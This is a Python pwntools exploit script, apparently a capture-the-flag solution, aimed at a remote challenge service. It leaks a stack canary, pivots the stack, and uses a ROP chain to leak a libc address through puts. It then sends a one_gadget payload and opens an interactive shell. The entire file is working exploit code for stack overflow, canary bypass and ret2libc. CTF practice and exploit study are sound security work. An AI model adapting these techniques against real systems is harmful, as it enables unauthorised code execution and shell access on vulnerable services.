from pwn import *
#io=process('./pwn')
libc=ELF('./libc.so.6')
#io=remote("ip",port)
io=remote("nc1.ctfplus.cn",16292)

io.send(b'a'*40)
io.recvuntil(b'a'*40)

canary=u64(io.recv(6)+b'\x00\x00')
print(hex(canary))
payload=b'a'*0x28+p64(canary)+p64(0x404800)+p64(0x401351)
#gdb.attach(io)
io.send(payload)
rdi=0x40123E

payload = p64(0x404700)+p64(rdi)+p64(0x404018)+p64(0x4010C0)+p64(0x401351)+p64(canary)+p64(0x4047d0)+p64(0x4013AF)
#gdb.attach(io)

io.send(payload)

io.recvuntil(b"Congratulations!\n")
io.recvuntil(b"Congratulations!\n")

base=u64(io.recv(6)+b'\x00\x00')-libc.sym.puts
#base=u64(io.recv(6)+b'\x00\x00')-libc.sym.time
print(hex(base))


system=base+libc.sym.system
binsh=base+next(libc.search(b"/bin/sh"))
payload=p64(0x404a00)+p64(base+0xebc81)+b'a'*0x18+p64(canary)+p64(0x4046d0)+p64(0x4013AF)
#gdb.attach(io)
io.send(payload)

io.interactive()